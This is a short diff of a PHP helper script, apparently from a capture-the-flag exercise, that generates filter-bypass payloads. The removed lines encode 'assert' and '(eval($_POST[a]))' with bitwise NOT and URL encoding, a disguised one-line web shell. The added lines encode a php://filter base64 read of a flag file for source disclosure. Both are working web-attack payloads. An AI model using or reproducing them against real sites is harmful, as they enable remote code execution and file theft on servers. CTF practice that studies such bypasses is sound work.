@@ -1,10 +1,4 @@
-<?php 
-error_reporting(0);
-$a='assert';
-$b=urlencode(~$a);
-echo $b;
-echo "<br>";
-$c='(eval($_POST[a]))';
-$d=urlencode(~$c);
-echo $d;
- ?>
+<?php
+$a='php://filter/read=convert.base64-encode/resource=rea1fl4g.php';
+echo urlencode(~$a);
+?>
